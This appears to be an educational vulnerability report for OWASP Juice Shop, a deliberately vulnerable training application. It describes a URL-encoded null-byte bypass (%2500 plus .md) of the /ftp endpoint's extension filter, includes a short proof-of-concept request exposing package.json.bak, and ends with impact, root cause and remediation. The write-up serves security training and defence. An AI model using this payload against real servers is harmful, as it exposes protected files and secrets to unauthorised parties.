CVE ID:-EDU-JUICESHOP-2026-T01-015
Affected Application and Component
Application: OWASP Juice Shop
Component: /ftp file serving endpoint
Affected File: package.json.bak
Version: Express ^4.21.0
Vulnerability Classification
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
CWE-22: Improper Limitation of a Pathname to a Restricted Directory
OWASP Top 10:
A02:2021 – Cryptographic Failures (Sensitive Data Exposure)
A05:2021 – Security Misconfiguration
CVSS v3.1 Score (Suggested)
Base Score: 6.5 (Medium)
Vector:
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Reason:
Network exploitable
No authentication required
High confidentiality impact
No integrity or availability impact
Description
The /ftp endpoint in OWASP Juice Shop improperly restricts access to files by validating only the file extension. The application allows access to files ending in .md and .pdf, returning a 403 error for other extensions.
However, the extension validation can be bypassed using URL-encoded null byte injection (%2500) combined with an allowed extension. This enables unauthorized access to restricted backup files such as package.json.bak.
This results in exposure of sensitive internal application configuration data.
Exploitation Steps
Navigate to:
http://localhost:3000/ftp
Attempt to access:
/ftp/package.json.bak
→ Returns 403 Forbidden
Bypass extension filter using encoded null byte:
/ftp/package.json.bak%2500.md
The server processes the file as:
package.json.bak
while validating it as .md, resulting in successful file retrieval.
Proof of Concept (PoC)
GET /ftp/package.json.bak%2500.md HTTP/1.1
Host: localhost:3000
Response:
HTTP 200 OK
Contents of package.json.bak displayed
Impact
An attacker can:
Access forgotten developer backup files
Retrieve application configuration
Extract dependency information
Analyze internal architecture
Use leaked information to chain further attacks
Although this specific file may not contain credentials, similar real-world misconfigurations could expose:
.env files
Database credentials
API keys
Private keys
This significantly reduces attack complexity.
Root Cause
Insecure file extension validation
Reliance on string-based filtering
Improper handling of encoded characters
Backup files stored within web-accessible directory
Remediation
Remove backup files from production environments.
Store backups outside the web root.
Implement strict server-side file access control.
Normalize and validate filenames before processing.
Avoid extension-based security decisions.
Disable directory listing on production servers.
